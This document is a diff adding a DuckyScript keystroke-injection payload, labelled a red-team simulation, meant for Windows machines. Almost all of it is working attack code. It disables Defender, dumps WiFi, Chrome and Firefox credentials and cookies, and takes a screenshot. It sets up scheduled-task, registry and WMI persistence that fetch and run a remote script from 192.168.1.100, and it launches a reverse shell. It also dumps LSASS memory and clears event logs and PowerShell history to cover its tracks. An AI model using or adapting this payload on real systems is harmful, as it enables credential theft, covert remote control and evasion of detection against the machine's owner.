@@ -1,0 +1,179 @@
+REM ============================================================
+REM ADVANCED PAYLOAD - Red Team Simulation
+REM For authorized security testing ONLY!
+REM ============================================================
+
+REM --- Part 1: Open PowerShell as Admin ---
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 3000
+LEFT
+DELAY 200
+ENTER
+DELAY 2000
+
+REM --- Part 2: Disable Windows Defender real-time protection ---
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 1000
+STRING Set-MpPreference -DisableBehaviorMonitoring $true
+ENTER
+DELAY 1000
+STRING Set-MpPreference -DisableBlockAtFirstSeen $true
+ENTER
+DELAY 1000
+STRING Add-MpPreference -ExclusionPath "C:\Temp"
+ENTER
+DELAY 800
+
+REM --- Part 3: Create hidden working directory ---
+STRING $dumpPath = "C:\Temp\SystemCache"; New-Item -ItemType Directory -Path $dumpPath -Force | Out-Null
+ENTER
+DELAY 500
+STRING attrib +h +s $dumpPath
+ENTER
+DELAY 500
+
+REM --- Part 4: Dump WiFi passwords ---
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+:(.+)$" | ForEach-Object {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }} | Format-Table -AutoSize | Out-File "$dumpPath\wifi_dump.txt"
+ENTER
+DELAY 2000
+
+REM --- Part 5: Steal Chrome saved passwords (Login Data) ---
+STRING $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; if (Test-Path $chromePath) { Copy-Item $chromePath "$dumpPath\chrome_login.db" -Force }
+ENTER
+DELAY 1000
+STRING $chromeCookies = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"; if (Test-Path $chromeCookies) { Copy-Item $chromeCookies "$dumpPath\chrome_cookies.db" -Force }
+ENTER
+DELAY 1000
+
+REM --- Part 6: Steal Firefox passwords ---
+STRING $ffProfile = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*" | Select-Object -First 1; if ($ffProfile) { Copy-Item "$($ffProfile.FullName)\logins.json" "$dumpPath\firefox_logins.json" -Force; Copy-Item "$($ffProfile.FullName)\key4.db" "$dumpPath\firefox_key4.db" -Force }
+ENTER
+DELAY 1500
+
+REM --- Part 7: Dump system info & env variables ---
+STRING systeminfo | Out-File "$dumpPath\systeminfo.txt"; Get-ComputerInfo | Out-File "$dumpPath\computerinfo.txt"; Get-ChildItem env: | Out-File "$dumpPath\env.txt"
+ENTER
+DELAY 1500
+
+REM --- Part 8: List installed software ---
+STRING Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize | Out-File "$dumpPath\installed_software.txt"
+ENTER
+DELAY 1500
+
+REM --- Part 9: Screenshot ---
+STRING Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save("$dumpPath\screenshot.png"); $graphics.Dispose(); $bitmap.Dispose()
+ENTER
+DELAY 2000
+
+REM --- Part 10: Webcam snapshot (if available) ---
+STRING $camera = Get-CimInstance Win32_PnPEntity | Where-Object {$_.Name -like "*camera*" -or $_.Name -like "*webcam*"}; if ($camera) { $ffmpeg = "$dumpPath\ffmpeg.exe"; if (-not (Test-Path $ffmpeg)) { Invoke-WebRequest -Uri "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip" -OutFile "$dumpPath\ffmpeg.zip" -UseBasicParsing }; Write-Host "Camera detected: $($camera.Name)" | Out-File "$dumpPath\camera_info.txt" }
+ENTER
+DELAY 2000
+
+REM --- Part 11: Create persistent scheduled task (runs every 5 min) ---
+STRING $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).downloadString('http://192.168.1.100/shell.ps1')`""; $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999); $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName "WindowsSystemCache" -Action $action -Trigger $trigger -Principal $principal -Force
+ENTER
+DELAY 2000
+
+REM --- Part 12: Add registry run key (another persistence) ---
+STRING Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDriveUpdate" -Value "powershell.exe -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).downloadString('http://192.168.1.100/shell.ps1')`"" -Force
+ENTER
+DELAY 800
+
+REM --- Part 13: WMI Event Subscription persistence ---
+STRING $filterName = "WindowsUpdateFilter"; $consumerName = "WindowsUpdateConsumer"; $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name=$filterName; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"}; $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName; CommandLineTemplate="powershell.exe -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).downloadString('http://192.168.1.100/shell.ps1')`""}; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$filter; Consumer=$consumer}
+ENTER
+DELAY 2000
+
+REM --- Part 14: Create reverse shell script locally ---
+STRING $revShell = @"
+while (`$true) {
+    try {
+        `$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);
+        `$stream = `$client.GetStream();
+        `$writer = New-Object System.IO.StreamWriter(`$stream);
+        `$reader = New-Object System.IO.StreamReader(`$stream);
+        `$writer.AutoFlush = `$true;
+        `$writer.WriteLine("Connected: `$env:COMPUTERNAME");
+        while (`$client.Connected) {
+            `$cmd = `$reader.ReadLine();
+            if (`$cmd -eq "exit") { break }
+            try { `$out = Invoke-Expression `$cmd 2>&1 | Out-String; `$writer.WriteLine(`$out) } catch { `$writer.WriteLine(`$_.Exception.Message) }
+        }
+        `$client.Close()
+    } catch { Start-Sleep -Seconds 10 }
+}
+"@; $revShell | Out-File "$dumpPath\rev.ps1" -Encoding UTF8
+ENTER
+DELAY 1500
+
+REM --- Part 15: Start reverse shell in background ---
+STRING Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dumpPath\rev.ps1`"" -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM --- Part 16: Dump LSASS memory (credential harvesting) ---
+STRING $lsassPath = "$dumpPath\lsass.dmp"; $lsass = Get-Process lsass; rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump $lsass.Id $lsassPath full
+ENTER
+DELAY 3000
+
+REM --- Part 17: Create a fake error message ---
+STRING Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Critical system error detected. Please contact your system administrator.", "Windows System Alert", "OK", "Error")
+ENTER
+DELAY 1000
+
+REM --- Part 18: Clear PowerShell history ---
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; Clear-History
+ENTER
+DELAY 500
+
+REM --- Part 19: Clear Event Logs (cover tracks) ---
+STRING wevtutil cl Security; wevtutil cl System; wevtutil cl Application
+ENTER
+DELAY 1500
+
+REM --- Part 20: Exit PowerShell ---
+STRING exit
+ENTER
+DELAY 500
+
+REM --- Part 21: Rick Roll (classic) ---
+DELAY 1000
+GUI r
+DELAY 500
+STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
+ENTER
+DELAY 2000
+
+REM --- Part 22: Open Notepad with summary ---
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 1000
+STRING ============================================
+ENTER
+STRING   ADVANCED PAYLOAD EXECUTED
+ENTER
+STRING ============================================
+ENTER
+STRING Files dumped to: C:\Temp\SystemCache
+ENTER
+STRING Reverse shell connecting to: 192.168.1.100:4444
+ENTER
+STRING Scheduled tasks created for persistence
+ENTER
+STRING Registry keys added
+ENTER
+STRING WMI subscriptions active
+ENTER
+STRING ============================================
+ENTER
+STRING CHANGE THE IP IN THE PAYLOAD!
+ENTER
+STRING ============================================
